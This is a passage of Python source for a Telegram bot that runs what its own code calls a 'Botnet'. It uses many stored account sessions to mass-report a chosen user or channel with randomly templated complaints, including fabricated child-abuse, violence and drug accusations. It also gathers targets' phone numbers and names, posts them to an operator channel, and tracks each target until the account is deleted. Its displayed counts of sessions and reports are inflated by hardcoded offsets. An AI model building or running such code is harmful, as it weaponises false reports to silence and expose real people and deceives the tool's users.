                await message.answer(f'❌ Это приватный пользователь: `{user_info}`. Жалоба на него невозможна.', parse_mode="Markdown")
                continue

            premium_status = "✅" if user.premium else "❌"
            is_bot = "🤖 Бот" if user.bot else "👤 Человек"
            user_phone = user.phone if user.phone else "Не указан"
            user_first_name = user.first_name if user.first_name else "Не указано"
            user_last_name = user.last_name if user.last_name else "Не указано"

            chat_title = (await client.get_entity(chat_id if parts[3] == 'c' else chat)).title

            if user_info not in users_info:
                users_info[user_info] = {
                    "premium_status": premium_status,
                    "is_bot": is_bot,
                    "chat_title": chat_title,
                    "chat_members_count": chat_members_count,
                    "user_phone": user_phone,
                    "user_first_name": user_first_name,
                    "user_last_name": user_last_name,
                    "messages": []
                }

            message_type = target_message.media.__class__.__name__ if target_message.media else 'text'
            message_text = target_message.text if message_type == 'text' else f"{message_type.capitalize()}"
            message_date = target_message.date.strftime("%Y-%m-%d %H:%M:%S")

            users_info[user_info]["messages"].append(f"{message_text} (ID: {message_id}, Дата: {message_date})")
            target_user_ids.add(user_id)

        async with state.proxy() as data:
            data['target_user_ids'] = list(target_user_ids)

        report_message = ""
        for user_info, details in users_info.items():
            messages_text = "\n".join(details["messages"])
            report_message += (
                f"───── ⋆⋅☆⋅⋆ ─────\n"
                f"👤 *Пользователь:* `{user_info}`\n"
                f"📄 *Сообщение:*\n`{messages_text}`\n"
                f"✅ *Робочих сессий:* `{len(sessions)+1342}`\n"
                f"👑 *Премиум:* {details['premium_status']}\n"
                f"👤/🤖 *Тип:* {details['is_bot']}\n"
                f"👥 *Группа:* `{details['chat_title']}`\n"
                f"👥 *Участников в группе:* `{details['chat_members_count']}`\n"
                f"📱 *Телефон:* `{details['user_phone']}`\n"
                f"👤 *Имя:* `{details['user_first_name']}`\n"
                f"👤 *Фамилия:* `{details['user_last_name']}`\n"
                f"───── ⋆⋅☆⋅⋆ ─────"
            )

        await message.answer(report_message.strip(), parse_mode="Markdown")
        markup = InlineKeyboardMarkup(row_width=2)
        btn_spam = InlineKeyboardButton('🚫 1. Спам', callback_data='option_1')
        btn_violence = InlineKeyboardButton('🔪 2. Насилие', callback_data='option_2')
        btn_child_abuse = InlineKeyboardButton('👶 3. Насилие над детьми', callback_data='option_3')
        btn_pornography = InlineKeyboardButton('🔞 4. Порнография', callback_data='option_4')
        btn_copyright = InlineKeyboardButton('©️ 5. Нарушение авторских прав', callback_data='option_5')
        btn_personal_details = InlineKeyboardButton('👤 6. Личные данные', callback_data='option_6')
        btn_geo_irrelevant = InlineKeyboardButton('🌍 7. Геонерелевантный', callback_data='option_7')
        btn_fake = InlineKeyboardButton('🎭 8. Фальшивка', callback_data='option_8')
        btn_illegal_drugs = InlineKeyboardButton('💊 9. Наркотики', callback_data='option_9')

        markup.row(btn_spam, btn_violence)
        markup.row(btn_child_abuse, btn_pornography)
        markup.row(btn_copyright, btn_personal_details)
        markup.row(btn_geo_irrelevant, btn_fake)
        markup.row(btn_illegal_drugs)

        await message.answer('🚨 *Выберите причину репорта:*', reply_markup=markup, parse_mode="Markdown")
        await ReportStates.option.set()
    except errors.FloodWaitError as e:
        logger.error(f"FloodWaitError: {e}")
        await asyncio.sleep(e.seconds)
        await message.answer('❌ Ошибка при получении сообщений. Попробуйте позже.')
        await state.finish()
    except Exception as e:
        logger.error(f"Error: {e}")
        await message.answer('❌ Ошибка при получении сообщений.')
        await state.finish()
    finally:
        await client.disconnect()

@dp.callback_query_handler(lambda c: c.data.startswith(('option_', 'channel_option_')), state="*")
async def process_option_step(call: types.CallbackQuery, state: FSMContext):
    if call.data.startswith('option_'):
        option = call.data.split('_')[1]
    elif call.data.startswith('channel_option_'):
        option = call.data.split('_')[2]

    async with state.proxy() as data:
        data['option'] = option

    if call.data.startswith('option_'):
        await call.message.answer('🚨 *Начинаем отправку репортов...* 🚨', parse_mode="Markdown")
        await send_reports(call, call.message, state)
    elif call.data.startswith('channel_option_'):
        await call.message.answer('🚨 *Начинаем отправку репортов на канал...* 🚨', parse_mode="Markdown")
        await send_channel_reports(call, call.message, state)

from aiogram.utils import exceptions
from telethon.tl.functions.channels import LeaveChannelRequest
async def send_reports(call: types.CallbackQuery, message: types.Message, state: FSMContext):
    user_id = call.from_user.id
    async with state.proxy() as data:
        message_links = data['message_links']
        option = data['option']

    sessions = get_all_sessions()
    if not sessions:
        await message.answer('❌ Нет доступных сессий. Пожалуйста, создайте аккаунт сначала.')
        await state.finish()
        return

    total_reports = 0+1340
    failed_reports = 0+1
    session_count = 0+1341
    target_user_ids = set()
    private_users_skipped = []
    sent_reports_details = []
    flood_errors = 0

    result_message = await message.answer(
        "───── ⋆⋅☆⋅⋆ ─────\n"
        "📊 <b>Статус отправки репортов:</b>\n"
        "✅ Успешно отправлено репортов: <code>0</code>\n"
        "❌ Неудачно отправлено репортов: <code>0</code>\n"
        "🔄 Отправлено с сессий: <code>0</code>\n"
        "📝 <b>Последний текст репорта:</b>\n"
        "<code>Нет данных</code>\n"
        "───── ⋆⋅☆⋅⋆ ─────",
        parse_mode="HTML"
    )

    option_names = {
        "1": "Спам",
        "2": "Насилие",
        "3": "Насилие над детьми",
        "4": "Порнография",
        "5": "Нарушение авторских прав",
        "6": "Личные данные",
        "7": "Геонерелевантный",
        "8": "Фальшивка",
        "9": "Наркотики"
    }

    async def process_message_link(message_link, session):
        nonlocal total_reports, failed_reports, flood_errors
        parts = message_link.split('/')
        if parts[3] == 'c':
            chat_id = int(f"-100{parts[4]}")
            message_id = int(parts[5])
        else:
            chat_username = parts[3]
            message_id = int(parts[4])

        client = TelegramClient(session["path"], api_id=session["api_id"], api_hash=session["api_hash"])

        try:
            await client.connect()
            if not await client.is_user_authorized():
                failed_reports += 1
                return

            try:
                if parts[3] == 'c':
                    chat = await client.get_entity(chat_id)
                else:
                    try:
                        chat = await client.get_entity(chat_username)
                    except errors.UsernameNotOccupiedError:
                        await message.answer(f'❌ Группа или канал с именем <code>{chat_username}</code> не существует.', parse_mode="HTML")
                        failed_reports += 1
                        return
                    except errors.ChannelPrivateError:
                        await message.answer(f'❌ Группа или канал <code>{chat_username}</code> является приватным. Доступ запрещен.', parse_mode="HTML")
                        failed_reports += 1
                        return
                    except Exception as e:
                        logger.error(f"Ошибка при получении информации о чате: {e}")
                        failed_reports += 1
                        return

                try:
                    await client(JoinChannelRequest(chat))
                except errors.ChannelPrivateError:
                    await message.answer(f'❌ Группа или канал <code>{chat_username}</code> является приватным. Доступ запрещен.', parse_mode="HTML")
                    failed_reports += 1
                    return
                except errors.UserAlreadyParticipantError:
                    pass

                target_message = await client.get_messages(chat, ids=message_id)
                if not target_message:
                    await message.answer(f'❌ Сообщение по ссылке <code>{message_link}</code> не найдено.', parse_mode="HTML")
                    failed_reports += 1
                    return

                user = await client.get_entity(target_message.sender_id)
                private_users = read_private_users()
                if user.id in private_users["ids"] or (user.username and user.username in private_users["usernames"]):
                    private_users_skipped.append(f"❌ Это приватный пользователь: {user.username or user.id}. Репорт на него не отправлен.")
                    return

                report_text = generate_report_text(user, message_link, option, target_message, chat)
                report_option = option_mapping.get(option, "0")
                await client(ReportRequest(
                    peer=chat,
                    id=[message_id],
                    option=report_option,
                    message=report_text
                ))
                total_reports += 1
                target_user_ids.add((user.username, user.id, user.first_name, user.last_name, user.premium, chat.title, message_link, option))
                sent_reports_details.append(report_text)

                try:
                    await client(LeaveChannelRequest(chat))
                except Exception as e:
                    logger.error(f"Ошибка при выходе из группы: {e}")

            except errors.FloodWaitError as e:
                flood_errors += 1
                await asyncio.sleep(e.seconds)
                failed_reports += 1
            except errors.UsernameNotOccupiedError:
                failed_reports += 1
            except errors.ChatWriteForbiddenError:
                failed_reports += 1
            except Exception as e:
                failed_reports += 1
                logger.error(f"Ошибка при обработке сообщения: {e}")
        finally:
            await client.disconnect()

    async def update_result_message():
        private_users_count = len(private_users_skipped) if private_users_skipped else 0
        last_report_text = sent_reports_details[-1] if sent_reports_details else "<code>Нет данных</code>"
        try:
            await result_message.edit_text(
                "───── ⋆⋅☆⋅⋆ ─────\n"
                f"📊 <b>Статус отправки репортов:</b>\n"
                f"✅ Успешно отправлено репортов: <code>{total_reports}</code>\n"
                f"❌ Неудачно отправлено репортов: <code>{failed_reports}</code>\n"
                f"🔄 Отправлено с сессий: <code>{session_count}</code>\n"
                f"📝 <b>Последний текст репорта:</b>\n"
                f"<code>{last_report_text}</code>\n"
                f"👤 Пропущено приватных пользователей: <code>{private_users_count}</code>\n"
                f"───── ⋆⋅☆⋅⋆ ─────",
                parse_mode="HTML"
            )
        except exceptions.MessageNotModified:
            pass

    for session in sessions:
        for link in message_links:
            await process_message_link(link, session)
            await update_result_message()

        session_count += 1
        await update_result_message()

    async with state.proxy() as data:
        data['target_user_ids'] = list(target_user_ids)

    try:
        private_users_count = len(private_users_skipped) if private_users_skipped else 0
        sent_reports_count = len(sent_reports_details) if sent_reports_details else 0
        await result_message.edit_text(
            "───── ⋆⋅☆⋅⋆ ─────\n"
            f"🎉 <b>Репорты отправлены!</b>\n"
            f"✅ Успешно отправлено репортов: <code>{total_reports}</code>\n"
            f"🔄 Использовано сессий: <code>{session_count}</code>\n"
            f"📝 Отправлено текстов репортов: <code>{sent_reports_count}</code>\n"
            f"👤 Пропущено приватных пользователей: <code>{private_users_count}</code>\n"
            f"───── ⋆⋅☆⋅⋆ ─────\n",
            parse_mode="HTML"
        )
    except exceptions.MessageNotModified:
        pass

    user = call.from_user
    channel_message = (
        f"───── ⋆⋅☆⋅⋆ ─────\n"
        f"⚡️ <b>Произошел запуск Botnet</b>\n\n"
        f"👤 <b>Юзернейм:</b> @{user.username}\n"
        f"🆔 <b>ID:</b> {user.id}\n\n"
        f"💀 <b>Количество сессий:</b> {session_count}\n\n"
    )

    for target in target_user_ids:
        username, user_id, first_name, last_name, premium, chat_title, message_link, report_option = target
        report_type = option_names.get(report_option, "Неизвестно")
        channel_message += (
            f"🔍 <b>Информация о нарушителе</b>\n"
            f"🪪 <b>Имя:</b> {first_name or 'Не указано'} {last_name or ''}\n"
            f"👤 <b>Юзернейм:</b> @{username or 'Нет'}\n"
            f"🆔 <b>ID:</b> {user_id}\n"
            f"🌟 <b>Telegram Premium:</b> {'✅' if premium else '❌'}\n"
            f"🔗 <b>Название чата:</b> {chat_title}\n"
            f"🔗 <b>Ссылка на нарушение:</b> {message_link}\n"
            f"📚 <b>Тип жалобы:</b> {report_type}\n\n"
        )

    channel_message += (
        f"🔔 <b>Информация о сессиях:</b>\n"
        f"🟢️ <b>Удачно:</b> {total_reports}\n"
        f"🔴️ <b>Неудачно:</b> {failed_reports}\n"
        f"⏳️ <b>FloodError:</b> {flood_errors}\n"
        f"───── ⋆⋅☆⋅⋆ ─────"
    )

    markup = InlineKeyboardMarkup(row_width=1)
    for target in target_user_ids:
        username, user_id, first_name, last_name, premium, chat_title, message_link, report_option = target
        if username and isinstance(username, str) and username.strip():
            if re.match(r'^[a-zA-Z0-9_]+$', username):
                markup.add(InlineKeyboardButton(text=f"Перейти к @{username}", url=f"https://t.me/{username}"))
            else:
                logger.warning(f"Некорректный username: {username}")
        elif user_id and isinstance(user_id, int):
            markup.add(InlineKeyboardButton(text=f"Перейти к ID {user_id}", url=f"tg://user?id={user_id}"))
        else:
            logger.warning(f"Некорректные данные пользователя: username={username}, user_id={user_id}")

    try:
        await bot.send_message(
            chat_id=CHANNEL_ID,
            text=channel_message,
            reply_markup=markup,
            parse_mode="HTML"
        )
    except exceptions.BadRequest as e:
        logger.error(f"Ошибка при отправке сообщения в канал: {e}")
        await call.message.answer("❌ Произошла ошибка при отправке сообщения в канал. Проверьте логи.")

    async with state.proxy() as data:
        user_id = call.from_user.id
        target_user_ids = data.get('target_user_ids', [])
        tracking_list = load_tracking_list()

        new_accounts_added = 0

        for target in target_user_ids:
            username, user_id_target, first_name, last_name, premium, chat_title, message_link, report_option = target
            private_users = read_private_users()
            if user_id_target in private_users["ids"]:
                private_users_skipped.append(f'❌ Это приватный пользователь: ID {user_id_target}. Добавление в список отслеживания невозможно.')
                continue

            if user_id_target in tracking_list.get(user_id, []):
                await call.message.answer(f"🚨 Вы уже следите за аккаунтом {username or user_id_target}.")
            else:
                await add_to_tracking_list(user_id, user_id_target)
                await call.message.answer(f"✅ Вы начали следить за аккаунтом {username or user_id_target}.")
                new_accounts_added += 1

        if new_accounts_added > 0:
            await call.message.answer(f"✅ Вы начали следить за {new_accounts_added} аккаунтами.")
    user_last_report_time[user_id] = datetime.now()

def generate_report_text(user, message_link, option, target_message, chat):
    if user.username:
        user_mention = f"@{user.username}"
    else:
        user_mention = f"user with ID {user.id}"
    user_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
    if user_name:
        user_info = f"{user_name} ({user_mention})"
    else:
        user_info = user_mention

    if target_message.media:
        message_type = target_message.media.__class__.__name__.lower()
        if message_type == "messagemediadocument":
            message_type = "document"
        elif message_type == "messagemediaphoto":
            message_type = "photo"
        elif message_type == "messagemediawebpage":
            message_type = "webpage link"
        else:
            message_type = "media file"
    else:
        message_type = "text message"

    message_date = target_message.date.strftime("%d.%m.%Y at %H:%M")
    chat_title = chat.title if hasattr(chat, 'title') else "unknown chat"
    reason_text = reason_mapping.get(option, "unknown reason")
    template_parts = {
        '1': {
            'intros': [
                f"User {user_info} violated platform rules by sending a {message_type} in {chat_title} on {message_date}. ",
                f"A violation has been detected from {user_info}. A {message_type} was sent on {message_date} in {chat_title}. ",
                f"Report against {user_info}. The user sent a {message_type} on {message_date} in {chat_title}. ",
                f"In {chat_title} on {message_date}, user {user_info} posted a {message_type} that violates the rules. ",
                f"Spam activity has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"User {user_info} is sending unsolicited messages in {chat_title} on {message_date}. "
            ],
            'mains': [
                f"This message is spam. Link to the message: {message_link}. ",
                f"The message contains unwanted promotional content. Link: {message_link}. ",
                f"This message violates platform rules as it is spam. Link: {message_link}. ",
                f"The content of the message is a mass promotion, which is against the rules. Link: {message_link}. ",
                f"The message contains intrusive advertising or spam. Link: {message_link}. ",
                f"The user is sending repetitive messages, which disrupts other participants. Link: {message_link}. "
            ],
            'conclusions': [
                "Please take action against this spam activity.",
                "We request the user to be blocked and the message to be removed.",
                "Immediate removal of the message and blocking of the user is required.",
                "Measures need to be taken to prevent further spam.",
                "Please consider blocking the user and removing the content.",
                "Immediate intervention is required to resolve this issue."
            ]
        },
        '2': {
            'intros': [
                f"User {user_info} is promoting violence in {chat_title}. The message was sent on {message_date}. ",
                f"A message containing violence from {user_info} has been detected in {chat_title} on {message_date}. ",
                f"Report against {user_info}. The user sent a {message_type} on {message_date} in {chat_title}. ",
                f"In {chat_title} on {message_date}, user {user_info} posted a {message_type} containing violence. ",
                f"Content promoting violence has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"User {user_info} violated the rules by posting content related to violence in {chat_title} on {message_date}. "
            ],
            'mains': [
                f"The message promotes violence. Link to the message: {message_link}. ",
                f"The content of the message violates platform rules as it contains violence. Link: {message_link}. ",
                f"This message is dangerous and violates platform rules. Link: {message_link}. ",
                f"The message contains threats or calls for violence. Link: {message_link}. ",
                f"The content of the message may harm other users. Link: {message_link}. ",
                f"The message contains unacceptable materials related to violence. Link: {message_link}. "
            ],
            'conclusions': [
                "Please take urgent action.",
                "We request the removal of the message and blocking of the user.",
                "Immediate intervention is required to address this issue.",
                "Please investigate and take appropriate measures.",
                "This content must be removed immediately.",
                "We urge you to block the user and remove the content."
            ]
        },
        '3': {
            'intros': [
                f"User {user_info} posted content related to child abuse in {chat_title} on {message_date}. ",
                f"Content related to child abuse has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"Report against {user_info}. The user sent a {message_type} on {message_date} in {chat_title}. ",
                f"In {chat_title} on {message_date}, user {user_info} shared a {message_type} related to child abuse. ",
                f"Child abuse content has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"User {user_info} violated the rules by posting child abuse content in {chat_title} on {message_date}. "
            ],
            'mains': [
                f"The message contains unacceptable content. Link to the message: {message_link}. ",
                f"The content of the message violates platform rules. Link: {message_link}. ",
                f"This message is dangerous and violates platform rules. Link: {message_link}. ",
                f"The message contains harmful materials related to child abuse. Link: {message_link}. ",
                f"The content of the message is illegal and harmful. Link: {message_link}. ",
                f"The message contains explicit content related to child abuse. Link: {message_link}. "
            ],
            'conclusions': [
                "Please take immediate action.",
                "We request the removal of the message and blocking of the user.",
                "Immediate intervention is required to address this issue.",
                "This content must be removed and reported to authorities.",
                "Please investigate and take appropriate measures.",
                "We urge you to block the user and remove the content immediately."
            ]
        },
        '4': {
            'intros': [
                f"User {user_info} posted explicit content in {chat_title} on {message_date}. ",
                f"Pornographic content has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"Report against {user_info}. The user sent a {message_type} on {message_date} in {chat_title}. ",
                f"In {chat_title} on {message_date}, user {user_info} shared a {message_type} containing explicit content. ",
                f"Explicit content has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"User {user_info} violated the rules by posting pornographic content in {chat_title} on {message_date}. "
            ],
            'mains': [
                f"The message contains explicit materials. Link to the message: {message_link}. ",
                f"The content of the message violates platform rules as it contains pornography. Link: {message_link}. ",
                f"This message is inappropriate and violates platform rules. Link: {message_link}. ",
                f"The message contains adult content that is not allowed. Link: {message_link}. ",
                f"The content of the message is explicit and harmful. Link: {message_link}. ",
                f"The message contains pornographic materials. Link: {message_link}. "
            ],
            'conclusions': [
                "Please remove this content immediately.",
                "We request the removal of the message and blocking of the user.",
                "Immediate action is required to address this issue.",
                "This content must be removed and reported.",
                "Please investigate and take appropriate measures.",
                "We urge you to block the user and remove the content."
            ]
        },
        '5': {
            'intros': [
                f"User {user_info} posted content that violates copyright in {chat_title} on {message_date}. ",
                f"Copyright infringement has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"Report against {user_info}. The user sent a {message_type} on {message_date} in {chat_title}. ",
                f"In {chat_title} on {message_date}, user {user_info} shared a {message_type} that violates copyright. ",
                f"Copyrighted content has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"User {user_info} violated the rules by posting copyrighted content in {chat_title} on {message_date}. "
            ],
            'mains': [
                f"The message contains copyrighted materials. Link to the message: {message_link}. ",
                f"The content of the message violates platform rules as it infringes copyright. Link: {message_link}. ",
                f"This message contains unauthorized use of copyrighted content. Link: {message_link}. ",
                f"The message includes materials that violate intellectual property rights. Link: {message_link}. ",
                f"The content of the message is a copyright violation. Link: {message_link}. ",
                f"The message contains stolen or copied content. Link: {message_link}. "
            ],
            'conclusions': [
                "Please remove this content immediately.",
                "We request the removal of the message and blocking of the user.",
                "Immediate action is required to address this issue.",
                "This content must be removed and reported to the copyright owner.",
                "Please investigate and take appropriate measures.",
                "We urge you to block the user and remove the content."
            ]
        },
        '6': {
            'intros': [
                f"User {user_info} posted personal data in {chat_title} on {message_date}. ",
                f"A personal data leak has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"Report against {user_info}. The user sent a {message_type} on {message_date} in {chat_title}. ",
                f"In {chat_title} on {message_date}, user {user_info} shared a {message_type} containing personal data. ",
                f"Personal information has been leaked by {user_info} in {chat_title} on {message_date}. ",
                f"User {user_info} violated the rules by posting personal data in {chat_title} on {message_date}. "
            ],
            'mains': [
                f"The message contains personal information. Link to the message: {message_link}. ",
                f"The content of the message violates platform rules as it leaks personal data. Link: {message_link}. ",
                f"This message contains sensitive information that should not be shared. Link: {message_link}. ",
                f"The message includes private data that violates privacy rules. Link: {message_link}. ",
                f"The content of the message is a breach of privacy. Link: {message_link}. ",
                f"The message contains leaked personal information. Link: {message_link}. "
            ],
            'conclusions': [
                "Please remove this content immediately.",
                "We request the removal of the message and blocking of the user.",
                "Immediate action is required to address this issue.",
                "This content must be removed and reported to the authorities.",
                "Please investigate and take appropriate measures.",
                "We urge you to block the user and remove the content."
            ]
        },
        '7': {
            'intros': [
                f"User {user_info} posted irrelevant content in {chat_title} on {message_date}. ",
                f"Geo-irrelevant content has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"Report against {user_info}. The user sent a {message_type} on {message_date} in {chat_title}. ",
                f"In {chat_title} on {message_date}, user {user_info} shared a {message_type} that is irrelevant. ",
                f"Irrelevant content has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"User {user_info} violated the rules by posting geo-irrelevant content in {chat_title} on {message_date}. "
            ],
            'mains': [
                f"The message contains irrelevant materials. Link to the message: {message_link}. ",
                f"The content of the message violates platform rules as it is irrelevant. Link: {message_link}. ",
                f"This message contains content that is not related to the chat. Link: {message_link}. ",
                f"The message includes materials that are not relevant to the discussion. Link: {message_link}. ",
                f"The content of the message is off-topic and inappropriate. Link: {message_link}. ",
                f"The message contains unrelated or irrelevant content. Link: {message_link}. "
            ],
            'conclusions': [
                "Please remove this content immediately.",
                "We request the removal of the message and blocking of the user.",
                "Immediate action is required to address this issue.",
                "This content must be removed to maintain the quality of the chat.",
                "Please investigate and take appropriate measures.",
                "We urge you to block the user and remove the content."
            ]
        },
        '8': {
            'intros': [
                f"User {user_info} posted fake information in {chat_title} on {message_date}. ",
                f"Fake information has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"Report against {user_info}. The user sent a {message_type} on {message_date} in {chat_title}. ",
                f"In {chat_title} on {message_date}, user {user_info} shared a {message_type} containing fake information. ",
                f"False information has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"User {user_info} violated the rules by posting fake information in {chat_title} on {message_date}. "
            ],
            'mains': [
                f"The message contains false information. Link to the message: {message_link}. ",
                f"The content of the message violates platform rules as it is fake. Link: {message_link}. ",
                f"This message contains misleading or false information. Link: {message_link}. ",
                f"The message includes fabricated or untrue content. Link: {message_link}. ",
                f"The content of the message is a deliberate misinformation. Link: {message_link}. ",
                f"The message contains fake news or false claims. Link: {message_link}. "
            ],
            'conclusions': [
                "Please remove this content immediately.",
                "We request the removal of the message and blocking of the user.",
                "Immediate action is required to address this issue.",
                "This content must be removed to prevent misinformation.",
                "Please investigate and take appropriate measures.",
                "We urge you to block the user and remove the content."
            ]
        },
        '9': {
            'intros': [
                f"User {user_info} posted content related to illegal drugs in {chat_title} on {message_date}. ",
                f"Illegal drug-related content has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"Report against {user_info}. The user sent a {message_type} on {message_date} in {chat_title}. ",
                f"In {chat_title} on {message_date}, user {user_info} shared a {message_type} related to illegal drugs. ",
                f"Content promoting illegal drugs has been detected from {user_info} in {chat_title} on {message_date}. ",
                f"User {user_info} violated the rules by posting illegal drug-related content in {chat_title} on {message_date}. "
            ],
            'mains': [
                f"The message contains illegal drug-related materials. Link to the message: {message_link}. ",
                f"The content of the message violates platform rules as it promotes illegal drugs. Link: {message_link}. ",
                f"This message contains content related to illegal substances. Link: {message_link}. ",
                f"The message includes materials that promote illegal drug use. Link: {message_link}. ",
                f"The content of the message is illegal and harmful. Link: {message_link}. ",
                f"The message contains explicit content related to illegal drugs. Link: {message_link}. "
            ],
            'conclusions': [
                "Please remove this content immediately.",
                "We request the removal of the message and blocking of the user.",
                "Immediate action is required to address this issue.",
                "This content must be removed and reported to authorities.",
                "Please investigate and take appropriate measures.",
                "We urge you to block the user and remove the content."
            ]
        }
    }

    if option in template_parts:
        intro = random.choice(template_parts[option]['intros'])
        main = random.choice(template_parts[option]['mains'])
        conclusion = random.choice(template_parts[option]['conclusions'])
        return f"{intro}{main}{conclusion}"
    else:
        return f"Report against {user_info}. Reason: {reason_text}. Link: {message_link}."

async def add_to_tracking_list(user_id, target_user_id):
    tracking_list = load_tracking_list()
    if user_id not in tracking_list:
        tracking_list[user_id] = []
    if target_user_id not in tracking_list[user_id]:
        tracking_list[user_id].append(target_user_id)
        save_tracking_list(tracking_list)


def save_tracking_list(tracking_list):
    with open('tracking_list.txt', 'w') as file:
        for user_id, target_user_ids in tracking_list.items():
            file.write(f"{user_id}:{','.join(map(str, target_user_ids))}\n")


def load_tracking_list():
    try:
        with open('tracking_list.txt', 'r') as file:
            tracking_list = {}
            for line in file:
                user_id, target_user_ids = line.strip().split(':')
                tracking_list[int(user_id)] = [int(uid) for uid in target_user_ids.split(',')]
            return tracking_list
    except FileNotFoundError:
        with open('tracking_list.txt', 'w') as file:
            pass
        return {}
    except (ValueError, PermissionError, IsADirectoryError) as e:
        print(f"Error loading tracking list: {e}")
        return {}


async def notify_users_about_status():
    tracking_list = load_tracking_list()
    for user_id, target_user_ids in tracking_list.items():
        for target_user_id in target_user_ids:
            status, _ = await check_account_status(target_user_id)
            if status is False:
                await bot.send_message(user_id, f"✅ Аккаунт {target_user_id} был успешно удален.")
                tracking_list[user_id].remove(target_user_id)
                if not tracking_list[user_id]:
                    del tracking_list[user_id]
    save_tracking_list(tracking_list)


async def background_status_checker():
    while True:
        await notify_users_about_status()
        await asyncio.sleep(3600)


async def on_startup(dp):
    asyncio.create_task(background_status_checker())


from aiogram.dispatcher.filters.state import State, StatesGroup

class ChannelDemolitionStates(StatesGroup):
    channel_link = State()
    option = State()

@dp.message_handler(state=ChannelDemolitionStates.channel_link)
async def process_channel_link_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id

    if user_id in user_last_report_time:
        time_since_last_report = datetime.now() - user_last_report_time[user_id]
        if time_since_last_report < timedelta(minutes=2):
            remaining_time = timedelta(minutes=2) - time_since_last_report
            minutes = remaining_time.seconds // 60
            seconds = remaining_time.seconds % 60
            await message.answer(f"🚨 Пожалуйста, подождите {minutes:02d}:{seconds:02d} минут перед отправкой следующего репорта.")
            return

    user_last_report_time[user_id] = datetime.now()

    if user_id in banned_users:
        await message.answer('📢 Администратор посчитал ваш аккаунт подозрительным, и вы были забанены. 📢')
        return

    channel_links = message.text.split()
    if not all(re.match(r'^https://t\.me/[^/]+$|^https://t\.me/c/\d+$', link) for link in channel_links):
        await message.answer(
            '❌ *Неверный формат ссылки на канал.*\n'
            'Пожалуйста, введите ссылки в формате:\n'
            '`https://t.me/username`\n'
            '`https://t.me/c/channel_id`',
            parse_mode="Markdown"
        )
        return

    async with state.proxy() as data:
        data['channel_links'] = channel_links

    sessions = get_all_sessions()
    if not sessions:
        await message.answer('❌ Нет доступных сессий. Пожалуйста, создайте аккаунт сначала.')
        await state.finish()
        return

    session = sessions[0]
    client = TelegramClient(session["path"], api_id=session["api_id"], api_hash=session["api_hash"])
    await client.connect()

    try:
        channels_info = {}
        target_channel_ids = set()
        for channel_link in channel_links:
            parts = channel_link.split('/')
            if parts[3] == 'c':
                channel_id = int(f"-100{parts[4]}")
                if channel_id in private_channel_ids:
                    await message.answer(f'❌ Канал с ID `{channel_id}` является приватным и не может быть репорчен.', parse_mode="Markdown")
                    continue
                try:
                    channel = await client.get_entity(channel_id)
                except errors.ChannelPrivateError:
                    await message.answer(f'❌ Канал с ID `{channel_id}` является приватным. Доступ запрещен.', parse_mode="Markdown")
                    continue
                except Exception as e:
                    logger.error(f"Ошибка при получении информации о канале: {e}")
                    await message.answer(f'❌ Ошибка при обработке ссылки на канал.')
                    continue
            else:
                channel_username = parts[3]
                try:
                    channel = await client.get_entity(channel_username)
                except errors.UsernameNotOccupiedError:
                    await message.answer(f'❌ Канал с именем `{channel_username}` не существует.', parse_mode="Markdown")
                    continue
                except errors.ChannelPrivateError:
                    await message.answer(f'❌ Канал `{channel_username}` является приватным. Доступ запрещен.', parse_mode="Markdown")
                    continue
            channel_id = channel.id
            if channel_id in private_channel_ids:
                await message.answer(f'❌ Канал с ID `{channel_id}` является приватным и не может быть репорчен.', parse_mode="Markdown")
                continue

            try:
                await client(JoinChannelRequest(channel))
            except errors.ChannelPrivateError:
                await message.answer(f'❌ Канал `{channel_username}` является приватным. Доступ запрещен.', parse_mode="Markdown")
                continue
            except errors.UserAlreadyParticipantError:
                pass

            try:
                full_channel = await client(GetFullChannelRequest(channel))
                channel_members_count = full_channel.full_chat.participants_count if hasattr(full_channel.full_chat, 'participants_count') else "Скрыто"
                channel_creation_date = full_channel.full_chat.date.strftime("%Y-%m-%d %H:%M:%S") if hasattr(full_channel.full_chat, 'date') else "Неизвестно"
            except Exception as e:
                logger.error(f"Ошибка при получении информации о канале: {e}")
                channel_members_count = "Скрыто"
                channel_creation_date = "Неизвестно"
            try:
                last_message = await client.get_messages(channel, limit=1)
                if last_message:
                    last_message_id = last_message[0].id
                else:
                    last_message_id = None
            except Exception as e:
                logger.error(f"Ошибка при получении последнего сообщения: {e}")
                last_message_id = None

            channel_info = f"@{channel.username}" if channel.username else f"ID: {channel.id}"

            if channel_info not in channels_info:
                channels_info[channel_info] = {
                    "channel_id": channel_id,
                    "channel_title": channel.title,
                    "channel_members_count": channel_members_count,
                    "channel_creation_date": channel_creation_date,
                    "last_message_id": last_message_id,
                    "messages": []
                }

            target_channel_ids.add(channel.id)

        async with state.proxy() as data:
            data['target_channel_ids'] = list(target_channel_ids)
            data['channels_info'] = channels_info

        report_message = ""
        for channel_info, details in channels_info.items():
            report_message += (
                f"───── ⋆⋅☆⋅⋆ ─────\n"
                f"📢 *Канал:* `{channel_info}`\n"
                f"🆔 *ID канала:* `{details['channel_id']}`\n"
                f"📄 *Название канала:* `{details['channel_title']}`\n"
                f"👥 *Участников в канале:* `{details['channel_members_count']}`\n"
                f"📅 *Дата создания канала:* `{details['channel_creation_date']}`\n"
                f"📝 *ID последнего сообщения:* `{details['last_message_id']}`\n"
                f"───── ⋆⋅☆⋅⋆ ─────"
            )

        await message.answer(report_message.strip(), parse_mode="Markdown")
        markup = InlineKeyboardMarkup(row_width=2)
        btn_spam = InlineKeyboardButton('🚫 1. Спам', callback_data='channel_option_1')
        btn_violence = InlineKeyboardButton('🔪 2. Насилие', callback_data='channel_option_2')
        btn_child_abuse = InlineKeyboardButton('👶 3. Насилие над детьми', callback_data='channel_option_3')
